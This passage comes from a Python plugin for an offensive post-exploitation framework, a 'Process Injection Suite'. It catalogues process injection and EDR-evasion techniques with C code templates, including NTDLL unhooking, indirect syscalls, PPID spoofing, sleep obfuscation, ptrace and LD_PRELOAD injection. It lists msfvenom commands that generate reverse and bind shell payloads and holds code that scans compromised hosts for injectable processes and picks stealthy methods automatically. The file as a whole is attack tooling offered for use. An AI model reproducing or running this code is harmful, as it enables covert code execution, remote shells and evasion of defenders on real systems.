NtCreateThreadEx(&hThread, PROCESS_ALL_ACCESS, NULL, hProcess, baseAddr, NULL, 0, 0, 0, 0, NULL);
''',
            mitre_id='T1055',
            complexity='high',
        ),
        
        InjectionTechnique(
            name='Indirect Syscalls',
            description='JMP via NTDLL to bypass hooks',
            platform='windows',
            category='evasion',
            detection_risk='low',
            success_rate=85,
            requires_admin=False,
            requires_debug_priv=True,
            edr_evasion=True,
            code_template='''
// Find syscall instruction in NTDLL
LPVOID syscallAddr = FindSyscallInNTDLL("NtAllocateVirtualMemory");
// JMP to syscall instruction
__asm {
    mov eax, syscall_number
    jmp syscallAddr
}
''',
            mitre_id='T1055',
            complexity='high',
        ),
        
        InjectionTechnique(
            name='NTDLL Unhooking',
            description='Restore NTDLL from disk to remove hooks',
            platform='windows',
            category='evasion',
            detection_risk='low',
            success_rate=90,
            requires_admin=False,
            requires_debug_priv=False,
            edr_evasion=True,
            code_template='''
// Map clean NTDLL from disk
HANDLE hFile = CreateFile("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
LPVOID cleanNTDLL = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
// Copy .text section to hooked NTDLL
memcpy(hookedNTDLL + textOffset, cleanNTDLL + textOffset, textSize);
''',
            mitre_id='T1055',
            complexity='high',
        ),
        
        InjectionTechnique(
            name='PPID Spoofing',
            description='Spoof parent process to hide process creation',
            platform='windows',
            category='evasion',
            detection_risk='low',
            success_rate=85,
            requires_admin=False,
            requires_debug_priv=False,
            edr_evasion=True,
            code_template='''
STARTUPINFOEX si;
si.StartupInfo.cb = sizeof(STARTUPINFOEX);
SIZE_T size;
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, NULL);
UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
CreateProcess(NULL, "cmd.exe", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
''',
            mitre_id='T1055',
            complexity='medium',
        ),
        
        InjectionTechnique(
            name='Sleep Obfuscation (Ekko)',
            description='Encrypt memory during sleep to evade scans',
            platform='windows',
            category='evasion',
            detection_risk='low',
            success_rate=85,
            requires_admin=False,
            requires_debug_priv=False,
            edr_evasion=True,
            code_template='''
// Create timer queue
HANDLE hTimerQueue = CreateTimerQueue();
// Encrypt beacon before sleep
VirtualProtect(beacon, size, PAGE_READWRITE, &oldProtect);
for (int i = 0; i < size; i++) beacon[i] ^= key;
// Sleep with encrypted memory
Sleep(sleepTime);
// Decrypt after sleep
for (int i = 0; i < size; i++) beacon[i] ^= key;
VirtualProtect(beacon, size, oldProtect, &oldProtect);
''',
            mitre_id='T1055',
            complexity='high',
        ),
        
        # ── Tier 7: Linux Techniques ──────────────────────────────────────
        InjectionTechnique(
            name='ptrace Injection',
            description='PTRACE_ATTACH + PTRACE_POKETEXT',
            platform='linux',
            category='classic',
            detection_risk='medium',
            success_rate=85,
            requires_admin=True,
            requires_debug_priv=False,
            edr_evasion=False,
            code_template='''
ptrace(PTRACE_ATTACH, pid, NULL, NULL);
waitpid(pid, &status, 0);
struct user_regs_struct regs;
ptrace(PTRACE_GETREGS, pid, NULL, &regs);
// Write shellcode to target process
for (int i = 0; i < shellcode_len; i += sizeof(long)) {
    ptrace(PTRACE_POKETEXT, pid, regs.rip + i, *(long*)(shellcode + i));
}
// Modify RIP to point to shellcode
regs.rip = regs.rip;
ptrace(PTRACE_SETREGS, pid, NULL, &regs);
ptrace(PTRACE_DETACH, pid, NULL, NULL);
''',
            mitre_id='T1055.008',
            complexity='medium',
        ),
        
        InjectionTechnique(
            name='LD_PRELOAD Hijacking',
            description='Shared library preloading via LD_PRELOAD',
            platform='linux',
            category='classic',
            detection_risk='medium',
            success_rate=90,
            requires_admin=False,
            requires_debug_priv=False,
            edr_evasion=False,
            code_template='''
// Compile malicious shared library
gcc -shared -fPIC -o payload.so payload.c
// Set LD_PRELOAD
export LD_PRELOAD=/path/to/payload.so
// Execute target program
./target_program
''',
            mitre_id='T1574.006',
            complexity='low',
        ),
        
        InjectionTechnique(
            name='/proc/pid/mem Injection',
            description='Direct memory write via /proc filesystem',
            platform='linux',
            category='advanced',
            detection_risk='medium',
            success_rate=80,
            requires_admin=True,
            requires_debug_priv=False,
            edr_evasion=False,
            code_template='''
int mem_fd = open("/proc/{pid}/mem", O_RDWR);
lseek(mem_fd, target_address, SEEK_SET);
write(mem_fd, shellcode, shellcode_len);
close(mem_fd);
''',
            mitre_id='T1055.009',
            complexity='medium',
        ),
        
        InjectionTechnique(
            name='GOT/PLT Hooking',
            description='Global Offset Table / Procedure Linkage Table hooking',
            platform='linux',
            category='evasion',
            detection_risk='low',
            success_rate=75,
            requires_admin=True,
            requires_debug_priv=False,
            edr_evasion=True,
            code_template='''
// Find GOT entry for target function
Elf64_Addr *got_entry = find_got_entry(target_function);
// Overwrite with hook function
*got_entry = (Elf64_Addr)hook_function;
''',
            mitre_id='T1055',
            complexity='high',
        ),
        
        InjectionTechnique(
            name='eBPF Injection',
            description='Extended BPF program injection',
            platform='linux',
            category='advanced',
            detection_risk='low',
            success_rate=70,
            requires_admin=True,
            requires_debug_priv=False,
            edr_evasion=True,
            code_template='''
// Load eBPF program
int prog_fd = bpf_prog_load(BPF_PROG_TYPE_KPROBE, ...);
// Attach to kernel function
int link_fd = bpf_program__attach_kprobe(prog, false, "sys_execve");
''',
            mitre_id='T1055',
            complexity='high',
        ),
    ]
    
    @classmethod
    def get_all_techniques(cls) -> List[InjectionTechnique]:
        return cls.TECHNIQUES
    
    @classmethod
    def get_techniques_by_platform(cls, platform: str) -> List[InjectionTechnique]:
        return [t for t in cls.TECHNIQUES if t.platform in [platform, 'all']]
    
    @classmethod
    def get_techniques_by_category(cls, category: str) -> List[InjectionTechnique]:
        return [t for t in cls.TECHNIQUES if t.category == category]
    
    @classmethod
    def get_evasion_techniques(cls) -> List[InjectionTechnique]:
        return [t for t in cls.TECHNIQUES if t.edr_evasion]
    
    @classmethod
    def get_technique_by_name(cls, name: str) -> Optional[InjectionTechnique]:
        for technique in cls.TECHNIQUES:
            if name.lower() in technique.name.lower():
                return technique
        return None


# ── Shellcode Database ─────────────────────────────────────────────────────

class ShellcodeDatabase:
    """Database of shellcode payloads."""
    
    PAYLOADS = [
        ShellcodePayload(
            name='calc.exe',
            description='Spawn calculator (Windows)',
            architecture='x64',
            platform='windows',
            command='msfvenom -p windows/x64/exec CMD=calc.exe -f c',
        ),
        
        ShellcodePayload(
            name='cmd.exe',
            description='Spawn cmd.exe (Windows)',
            architecture='x64',
            platform='windows',
            command='msfvenom -p windows/x64/exec CMD=cmd.exe -f c',
        ),
        
        ShellcodePayload(
            name='reverse_tcp',
            description='Reverse TCP shell (Windows)',
            architecture='x64',
            platform='windows',
            command='msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f c',
        ),
        
        ShellcodePayload(
            name='bind_tcp',
            description='Bind TCP shell (Windows)',
            architecture='x64',
            platform='windows',
            command='msfvenom -p windows/x64/meterpreter/bind_tcp LPORT={lport} -f c',
        ),
        
        ShellcodePayload(
            name='bash_reverse',
            description='Reverse bash shell (Linux)',
            architecture='x64',
            platform='linux',
            command='msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c',
        ),
        
        ShellcodePayload(
            name='id_command',
            description='Execute id command (Linux)',
            architecture='x64',
            platform='linux',
            command='msfvenom -p linux/x64/exec CMD=id -f c',
        ),
    ]
    
    @classmethod
    def get_all_payloads(cls) -> List[ShellcodePayload]:
        return cls.PAYLOADS
    
    @classmethod
    def get_payload_by_name(cls, name: str) -> Optional[ShellcodePayload]:
        for payload in cls.PAYLOADS:
            if name.lower() in payload.name.lower():
                return payload
        return None


# ── Process Analyzer ───────────────────────────────────────────────────────

class ProcessAnalyzer:
    """Analyzes running processes for injection targets."""
    
    @staticmethod
    def analyze_windows(exec_func, session) -> List[Dict]:
        """Analyze Windows processes."""
        targets = []
        
        # Get process list
        cmd = "powershell -nop -c \"Get-Process | Select-Object Name,Id,SessionId,Path | Format-Table -AutoSize\" 2>nul"
        out = exec_func(session, cmd)
        
        if out:
            for line in out.strip().split('\n')[2:]:  # Skip header
                parts = line.split()
                if len(parts) >= 2:
                    name = parts[0]
                    try:
                        pid = int(parts[1])
                        
                        # Check if target
                        target = WindowsProcessesDatabase.get_process_by_name(name)
                        if target:
                            targets.append({
                                'name': name,
                                'pid': pid,
                                'category': target.category,
                                'protection': target.protection_level,
                                'success_rate': target.injection_success_rate,
                                'detection_risk': target.detection_risk,
                            })
                    except ValueError:
                        pass
        
        return targets
    
    @staticmethod
    def analyze_linux(exec_func, session) -> List[Dict]:
        """Analyze Linux processes."""
        targets = []
        
        # Get process list
        cmd = "ps aux 2>/dev/null"
        out = exec_func(session, cmd)
        
        if out:
            for line in out.strip().split('\n')[1:]:  # Skip header
                parts = line.split()
                if len(parts) >= 11:
                    user = parts[0]
                    try:
                        pid = int(parts[1])
                        name = parts[10].split('/')[-1]
                        
                        # Check if target
                        target = LinuxProcessesDatabase.get_process_by_name(name)
                        if target:
                            targets.append({
                                'name': name,
                                'pid': pid,
                                'user': user,
                                'category': target.category,
                                'protection': target.protection_level,
                                'success_rate': target.injection_success_rate,
                                'detection_risk': target.detection_risk,
                            })
                    except ValueError:
                        pass
        
        return targets


# ── Auto-Selection Engine ──────────────────────────────────────────────────

class AutoSelectionEngine:
    """Automatically selects best injection technique."""
    
    @staticmethod
    def select_technique(platform: str, target_process: str = None,
                         stealth: bool = False) -> Optional[InjectionTechnique]:
        """Select best technique based on environment."""
        
        techniques = InjectionTechniquesDatabase.get_techniques_by_platform(platform)
        
        # Filter by stealth requirement
        if stealth:
            techniques = [t for t in techniques if t.edr_evasion or t.detection_risk == 'low']
        
        # Filter by target process
        if target_process:
            target = None
            if platform == 'windows':
                target = WindowsProcessesDatabase.get_process_by_name(target_process)
            else:
                target = LinuxProcessesDatabase.get_process_by_name(target_process)
            
            if target and target.protection_level in ['PPL', 'protected']:
                # Need advanced techniques
                techniques = [t for t in techniques if t.complexity == 'high']
        
        # Sort by success rate
        techniques.sort(key=lambda t: t.success_rate, reverse=True)
        
        return techniques[0] if techniques else None


# ── Main Plugin ─────────────────────────────────────────────────────────────

class ProcessInjectionSuite(NexPlugin):
    name        = "process-injection-suite"
    description = "Advanced process injection engine — 25+ techniques, EDR evasion, shellcode generation"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "all"
    category    = "evasion"
    mitre_id    = "T1055"
    
    def run(self, session, args: list):
        # Parse args
        scan_mode = '--scan' in (args or [])
        list_mode = '--list' in (args or [])
        technique_name = None
        target_pid = None
        target_process = None
        shellcode_name = None
        stealth = False
        auto_mode = False
        
        for a in (args or []):
            if a.startswith('--technique='):
                technique_name = a.split('=', 1)[1]
            elif a.startswith('--pid='):
                try:
                    target_pid = int(a.split('=', 1)[1])
                except:
                    pass
            elif a.startswith('--process='):
                target_process = a.split('=', 1)[1]
            elif a.startswith('--shellcode='):
                shellcode_name = a.split('=', 1)[1]
            elif a == '--stealth':
                stealth = True
            elif a == '--auto':
                auto_mode = True
        
        self.info(f"💉 Starting Process Injection Suite v3.0 (stealth={stealth})")
        
        start_time = time.time()
        sections = []
        
        sections.append("\n" + "━"*64)
        sections.append("  [💉 Process Injection Suite v3.0 — Advanced Injection Engine]")
        sections.append("━"*64)
        
        # ── Step 1: Platform Detection ────────────────────────────────────
        platform = self._detect_platform(session)
        sections.append(f"  Platform: {platform.upper()}")
        sections.append(f"  Stealth Mode: {'ENABLED' if stealth else 'DISABLED'}")
        
        # ── Step 2: List Techniques ───────────────────────────────────────
        if list_mode:
            sections.append("\n[*] Phase 1: Available Injection Techniques")
            sections.append("─"*64)
            
            techniques = InjectionTechniquesDatabase.get_techniques_by_platform(platform)
            
            sections.append(f"  [+] {len(techniques)} techniques available:")
            
            for technique in techniques:
                stealth_icon = '🟢' if technique.edr_evasion else '🟡' if technique.detection_risk == 'low' else '🟠' if technique.detection_risk == 'medium' else '🔴'
                sections.append(f"    {stealth_icon} {technique.name}")
                sections.append(f"        Success: {technique.success_rate}% | Risk: {technique.detection_risk}")
                sections.append(f"        EDR Evasion: {'YES' if technique.edr_evasion else 'NO'}")
                sections.append(f"        Complexity: {technique.complexity}")
            
            return '\n'.join(sections)
        
        # ── Step 3: Process Scanning ──────────────────────────────────────
        if scan_mode or auto_mode:
            sections.append("\n[*] Phase 1: Process Target Scanning")
            sections.append("─"*64)
            
            if platform == 'windows':
                targets = ProcessAnalyzer.analyze_windows(self._exec, session)
            else:
                targets = ProcessAnalyzer.analyze_linux(self._exec, session)
            
            if targets:
                sections.append(f"  [+] {len(targets)} injection targets found:")
                
                for target in targets[:20]:
                    stealth_icon = '🟢' if target['success_rate'] >= 90 else '🟡' if target['success_rate'] >= 80 else '🟠'
                    sections.append(f"    {stealth_icon} {target['name']} (PID: {target['pid']})")
                    sections.append(f"        Category: {target['category']} | Protection: {target['protection']}")
                    sections.append(f"        Success Rate: {target['success_rate']}% | Detection Risk: {target['detection_risk']}")
            else:
                sections.append("  [-] No injection targets found")
        
        # ── Step 4: Shellcode Generation ──────────────────────────────────
        if shellcode_name:
            sections.append("\n[*] Phase 2: Shellcode Generation")
            sections.append("─"*64)
            
            payload = ShellcodeDatabase.get_payload_by_name(shellcode_name)
            
            if payload:
                sections.append(f"  [+] Payload: {payload.name}")
                sections.append(f"      Description: {payload.description}")
                sections.append(f"      Architecture: {payload.architecture}")
                sections.append(f"      Command: {payload.command}")
                
                # Generate shellcode
                cmd = payload.command.format(lhost='10.0.0.1', lport='4444')
                sections.append(f"\n  [*] Generate with: {cmd}")
            else:
                sections.append(f"  ❌ Payload not found: {shellcode_name}")
        
        # ── Step 5: Technique Selection ───────────────────────────────────
        if auto_mode or technique_name:
            sections.append("\n[*] Phase 3: Technique Selection")
            sections.append("─"*64)
            
            if auto_mode:
                technique = AutoSelectionEngine.select_technique(
                    platform, target_process, stealth
                )
            else:
                technique = InjectionTechniquesDatabase.get_technique_by_name(technique_name)
            
            if technique:
                sections.append(f"  ✅ Selected: {technique.name}")
                sections.append(f"      Description: {technique.description}")
                sections.append(f"      Success Rate: {technique.success_rate}%")
                sections.append(f"      Detection Risk: {technique.detection_risk}")
                sections.append(f"      EDR Evasion: {'YES' if technique.edr_evasion else 'NO'}")
                sections.append(f"      Complexity: {technique.complexity}")
                sections.append(f"      MITRE: {technique.mitre_id}")
                
                sections.append(f"\n  [*] Code Template:")
                sections.append(f"      {technique.code_template[:300]}...")
            else:
                sections.append("  ❌ No suitable technique found")
        
        # ── Step 6: Summary ───────────────────────────────────────────────
        duration = round(time.time() - start_time, 2)
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 Injection Suite Summary]")
        sections.append("━"*64)
        sections.append(f"  Platform: {platform.upper()}")
        sections.append(f"  Stealth Mode: {'ENABLED' if stealth else 'DISABLED'}")
        sections.append(f"  Duration: {duration}s")
        
        # ── Step 7: Save to Loot ──────────────────────────────────────────
        self.loot(
            {
                "type": "injection_suite_session",
                "platform": platform,
                "stealth": stealth,
                "duration": duration,
            },
            category='evasion',
            source='process-injection-suite',
            confidence='high'
        )
        
        self.emit(
            'timeline.event',
            title=f"Process Injection Suite Complete — Platform: {platform}",
            type='evasion',
            plugin=self.name
        )
        
        self.info(f"💉 Process Injection Suite complete — Platform: {platform}")
        
        return '\n'.join(sections)
    
    def _detect_platform(self, session) -> str:
        for attr in ('OS', 'os', 'platform'):
            val = getattr(session, attr, None)
            if val and isinstance(val, str):
                if 'windows' in val.lower():
                    return 'windows'
                if 'linux' in val.lower():
                    return 'linux'
        try:
            out = self._exec(session, 'echo %OS%') or ''
            if 'Windows' in out:
                return 'windows'
        except Exception:
            pass
        return 'linux'
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''